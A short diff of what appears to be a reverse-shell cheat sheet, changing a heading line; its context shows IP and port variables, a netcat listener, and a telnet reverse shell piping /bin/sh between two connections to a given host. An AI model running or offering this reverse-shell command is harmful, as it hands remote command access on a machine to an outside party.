@@ -1,4 +1,4 @@
-make your env variables for easy command calling
+make your env variables  
 IP=your IP
 PORT=your prefered port
 
@@ -25,3 +25,4 @@ nc -lvp $PORT2
 
 telnet $IP $PORT | /bin/sh | telnet $IP $PORT
  
+
